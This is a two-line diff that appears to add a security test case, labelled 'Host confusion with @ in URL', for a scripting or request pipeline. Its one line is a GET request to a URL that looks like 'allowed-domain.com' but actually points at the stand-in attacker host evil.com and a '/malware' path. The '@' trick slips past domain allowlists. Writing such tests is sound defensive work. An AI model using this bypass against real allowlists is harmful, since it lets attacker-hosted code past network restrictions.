@@ -1,0 +1,2 @@
+# Host confusion with '@' in URL
+[http(get)@"https://allowed-domain.com@evil.com/malware"]>[print]
